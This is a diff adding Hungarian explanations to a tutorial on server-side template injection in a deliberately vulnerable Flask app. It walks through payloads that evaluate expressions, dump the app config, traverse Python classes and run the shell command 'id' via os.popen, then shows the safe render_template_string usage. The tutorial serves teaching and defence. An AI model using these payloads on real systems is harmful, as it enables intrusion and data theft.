@@ -18,9 +18,14 @@ cd ssti
 pip install flask
 ```
 
+Az `app.py` fájl fogja tartalmazni a (szándékosan sérülékeny) webalkalmazást. Ezt a
+legegyszerűbben úgy tölthetjük fel tartalommal, hogy a következő parancsot kiadva...
+
 ```bash
 cat > app.py
 ```
+
+... a következő kódot a vágólapra helyezzük...
 
 ```python
 from flask import Flask, request, render_template_string
@@ -58,21 +63,56 @@ if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000)
 ```
 
+... majd egy üres sorban Ctrl-D-t ütünk. (Ezt csak üres sorban tehetjük meg, tehát
+üssünk előtte egy entert, ha szükséges.)
+
+A programot a következő paranccsal tudjuk teszt céllal indítani. Fontos, hogy a fentebb
+aktivált venv-ben legyünk. (Egy webalkalmazás indítása éles környezetben nem így célszerű,
+de ez túlmutat a sérülékenység leírásán.)
+
 ```bash
 python app.py
 ```
+
+A webalkalmazás az 5000-es porton érhető el. Próbáljunk különböző szövegeket írni a beviteli
+mezőbe. A webalkalmazás szó szerint azt írja ki, amit beírtunk.
+
+## A támadás menete
+
+Kivéve akkor, ha valami
+olyat írunk be, amit a template engine értelmez. Például:
 
 ```
 {{7*7}}
 ```
 
+Erre 49 lesz az eredmény, mivel a `{{` és `}}` közti részt a template engine
+értelmezi. Hasonló módon hozzáférhetünk például konfigurációs adatokhoz:
+
 ```
 {{config}}
+```
+
+Illetve bizonyos objektumokból kiindulva a rendszer egyes osztályaihoz...
+
+```
 {{ ''.__class__ }}
 {{ ''.__class__.__mro__[1].__subclasses__() }}
+```
+
+Ezeken keresztül pedig meghívhatunk függvényeket.
+
+Egy másik megközelítéssel például rendszer (shell) parancsok futtatására is lehetőségünk van.
+
+```
 {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
 ```
+
+## Védekezés
+
+Maga a template engine alapvetően jó, csak a használata nem volt az. A helyes használata a következő:
 
 ```python
 return render_template_string("Hello {{ name }}!", name=name)
 ```
+
